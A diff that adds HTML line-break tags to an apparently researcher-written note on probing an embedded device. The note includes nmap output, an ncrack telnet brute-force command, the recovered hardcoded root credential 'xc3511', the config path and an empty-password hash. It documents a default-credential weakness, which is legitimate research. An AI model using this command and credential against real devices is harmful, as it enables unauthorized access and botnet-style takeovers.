@@ -17,24 +17,24 @@
 <br/>9528/tcp  open     unknown
 <br/>34567/tcp open     dhanalakshmi?
 <br/>34599/tcp open     unknown
-
-Device type: WAP
-Running: Linux 2.4.X
-OS CPE: cpe:/o:linux:linux_kernel:2.4.36
-OS details: DD-WRT v24-sp1 (Linux 2.4.36)
-Network Distance: 5 hops
-Service Info: Host: LocalHost
-
-And, with ncrack i "recover" hardcored telnet creds.
-
-ncrack 192.168.100.15:23 -U logins.txt -P passwords.txt
-Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-05-26 13:06
-Discovered credentials for telnet on 192.168.100.15 23/tcp:
-192.168.100.15:23 23/tcp telnet: 'root' 'xc3511'
-Ncrack done: 1 service scanned in 27.06 seconds.
-Ncrack finished.
-
-Web-ui configuration files are stored in /mnt/mtd/Config/, but i did not understand password hash in file Account1.
-Also, in my case sed did not work. Empty password hash - tlJwpbo6.
-
-Still work on this.
+<br/>
+<br/>Device type: WAP
+<br/>Running: Linux 2.4.X
+<br/>OS CPE: cpe:/o:linux:linux_kernel:2.4.36
+<br/>OS details: DD-WRT v24-sp1 (Linux 2.4.36)
+<br/>Network Distance: 5 hops
+<br/>Service Info: Host: LocalHost
+<br/>
+<br/>And, with ncrack i "recover" hardcored telnet creds.
+<br/>
+<br/>ncrack 192.168.100.15:23 -U logins.txt -P passwords.txt
+<br/>Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-05-26 13:06
+<br/>Discovered credentials for telnet on 192.168.100.15 23/tcp:
+<br/>192.168.100.15:23 23/tcp telnet: 'root' 'xc3511'
+<br/>Ncrack done: 1 service scanned in 27.06 seconds.
+<br/>Ncrack finished.
+<br/>
+<br/>Web-ui configuration files are stored in /mnt/mtd/Config/, but i did not understand password hash in file Account1.
+<br/>Also, in my case sed did not work. Empty password hash - tlJwpbo6.
+<br/>
+<br/>Still work on this.
